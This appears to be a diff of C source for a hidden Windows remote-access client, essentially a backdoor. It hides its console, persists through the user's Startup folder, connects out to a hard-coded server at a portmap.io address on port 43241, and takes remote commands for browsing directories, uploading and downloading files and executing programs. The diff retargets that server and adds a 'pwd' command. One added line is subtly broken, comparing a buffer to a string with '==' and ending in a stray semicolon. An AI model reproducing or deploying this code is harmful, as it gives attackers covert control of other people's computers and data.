@@ -25,7 +25,7 @@ SOCKADDR_IN  hint;
 
 
 char err[7] = "error\n";
-char drives[100];
+char disk[100];
 
 
 int wsa_soc_con( char* IP, int port )
@@ -66,7 +66,7 @@ int check_path( char* path ){
     return 0;
 }
 
-void get_drives(){
+void get_disk(){
 
     char* letters[26] = {
         "A:", "B:", "C:", "D:", "E:", 
@@ -81,9 +81,9 @@ void get_drives(){
 
     for ( int i = 0; i < 26; i++ ) {
         if ( check_path(letters[i]) == 0 ) {
-            drives[count] = 64+i+1;
+            disk[count] = 64+i+1;
             count++;
-            drives[count] = '\n';
+            disk[count] = '\n';
             count++;
         }
     }
@@ -157,7 +157,6 @@ int download_file( SOCKET sock ) {
 
 int upload_file( char* filename, SOCKET sock ) {
     FILE* fptr; 
-    int read;
     char buffer[1];
     
     memset(buffer, 0, sizeof(buffer));
@@ -180,12 +179,10 @@ int upload_file( char* filename, SOCKET sock ) {
 
 
 int ls_dir( SOCKET sock ) {
-    char* name;
-    char store_one[BUFF_LEN];
-    char send_dir[BUFF_LEN];
-    char send_one[1];
-    int count = 0;
-    int i;
+    char store_one[1000];
+    char buffrecv[1000];
+    int sendRes;
+    int byteRecvd;
 
 
     WIN32_FIND_DATA fdfile;
@@ -199,27 +196,51 @@ int ls_dir( SOCKET sock ) {
     {
         return 1;
     }
-    name = Buffer;
-    sprintf(send_dir, "\n%s: %s\n\n", "Directory", name);
-    send(sock, send_dir, sizeof(send_dir), 0);
-   
+
     char newpath[2048];
-    sprintf(newpath, "%s\\*.*", name);
+    sprintf(newpath, "%s\\*.*", Buffer);
     
     if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ){
         return 1;
     }
-    
+
     do
     {
-        if ( strcmp(fdfile.cFileName, ".") != 0 && strcmp(fdfile.cFileName, "..") != 0 ){
+        if ( strcmp(fdfile.cFileName, ".") != 0 && strcmp(fdfile.cFileName, "..") != 0 ) {
             sprintf(store_one, "%s\n", fdfile.cFileName);
-            send(sock, store_one, sizeof(store_one), 0);
+            sendRes = send(sock, store_one, sizeof(store_one), 0);
+            
+            if (sendRes == SOCKET_ERROR) {
+                return 1;
+            }
+
+            if ((byteRecvd = recv(sock, buffrecv, sizeof(buffrecv), 0)) > 0 && buffrecv == "done");
         }
 
     } while ( FindNextFile(hfind, &fdfile) );
     
     FindClose(hfind);
+
+    return 0;
+}
+
+
+int pwd( SOCKET sock ) {
+    TCHAR Buffer[BUFSIZE];
+    DWORD dwRet;
+    char msg[BUFF_LEN];
+    memset(Buffer, 0, sizeof(Buffer));
+    memset(msg, 0, sizeof(msg));
+
+    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
+    if( dwRet == 0 )
+    {
+        return 1;
+    }
+
+    sprintf(msg, "\n[*]Current Directory: %s\n", Buffer);
+
+    send(sock, msg, sizeof(msg), 0);
 
     return 0;
 }
@@ -281,7 +302,6 @@ void ClientSoc( char* IP , int port ) {
                 WSACleanup();
                 break;
             }
-
             if ( first_word(buffrecv, "cd") == 0 ) {
                 for ( i = 3; buffrecv[i] != '\0'; i++ ){
                     out_msg[count] = buffrecv[i];
@@ -370,15 +390,18 @@ void ClientSoc( char* IP , int port ) {
                 send(sock, "[*]Executed", sizeof("[*]Executed"), 0);
                 
             }
-            else if ( strcmp(buffrecv, "ls_drives\n") == 0 ) {
-                send(sock, drives, sizeof(drives), 0);
+            else if ( strcmp(buffrecv, "pwd\n") == 0 ) {
+                pwd(sock);
+            }
+            else if ( strcmp(buffrecv, "ls_disk\n") == 0 ) {
+                send(sock, disk, sizeof(disk), 0);
             }
             else if ( strcmp(buffrecv, "exit_client\n") == 0 ) {
                 exit(1);
             }
             else
             {
-                send(sock, "unknown command", sizeof("unknown command"), 0);
+                send(sock, "unknown command\n", sizeof("unknown command\n"), 0);
             }
         }
     }
@@ -387,8 +410,7 @@ void ClientSoc( char* IP , int port ) {
 
 int main( int argc, char* argv[] ) {
     FreeConsole();
-
-    get_drives();
+    get_disk();
 
     WSADATA wsaData;
     DWORD dwError;
@@ -396,7 +418,6 @@ int main( int argc, char* argv[] ) {
     char *host_name;
     struct in_addr addr;
 
-    char exe_path[900];
     char temp_name[300];
     char current_exe[300];
     char path_name[900];
@@ -411,7 +432,7 @@ int main( int argc, char* argv[] ) {
         return 1;
     }
 
-    host_name = "host.io";
+    host_name = "ehonline-43241.portmap.io";
     remoteHost = gethostbyname(host_name);
     
     if ( remoteHost == NULL ) {
@@ -440,7 +461,7 @@ int main( int argc, char* argv[] ) {
     }
 
     char* IP = inet_ntoa(addr);
-    int PORT = 9999;
+    int PORT = 43241;
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
@@ -448,7 +469,6 @@ int main( int argc, char* argv[] ) {
     if ( check_path(path_name) == 0 ) {
         memset(current_exe, 0, sizeof(current_exe));
         memset(temp_name, 0, sizeof(temp_name));
-        memset(exe_path, 0, sizeof(exe_path));
         memset(path_name, 0, sizeof(path_name));
         
         for ( i = strlen(argv[0]) - 1; i != 0; i-- ) {
